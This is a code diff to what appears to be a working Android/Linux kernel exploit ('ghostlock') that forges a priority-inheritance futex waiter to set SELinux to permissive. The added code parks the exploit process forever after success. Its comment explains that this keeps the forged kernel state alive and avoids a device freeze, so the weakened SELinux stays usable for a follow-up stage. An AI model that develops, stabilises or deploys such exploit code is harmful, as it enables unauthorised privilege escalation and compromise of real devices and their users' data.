@@ -10,6 +10,9 @@
  * ghostlock::victim, ghostlock::race and ghostlock::stages.
  */
 
+#include <stdlib.h>
+#include <unistd.h>
+
 #include "session/exploit_stages.hpp"
 
 using namespace ghostlock;
@@ -48,6 +51,21 @@ int main(int argc, char **argv) {
         case stages::StageResult::Failed:
             return 1;
         case stages::StageResult::Done:
+            /* Calibration/hand-off: the W1 write leaves the forged PI waiter
+             * linked into the waiter thread's task_struct (pi_blocked_on) and
+             * into the fake lock's rbtree. Tearing the process down runs the
+             * kernel's exit-time PI/futex cleanup over that forged state and
+             * wedges the machine (observed twice: W1 reported "SELinux
+             * permissive" and exit=0, then the screen froze with adb dead and
+             * no panic). Parking here keeps the forged state owned by a live
+             * process that never exits, so the permissive SELinux stays usable
+             * for an out-of-process follow-up. */
+            if (getenv("GHOSTLOCK_PARK_AFTER_W1")) {
+                pr_success("parking after W1: forged PI state kept alive "
+                           "(pid=%d); do NOT exit/kill this process\n",
+                           (int) getpid());
+                for (;;) pause();
+            }
             return 0;
         case stages::StageResult::Continue:
             break;
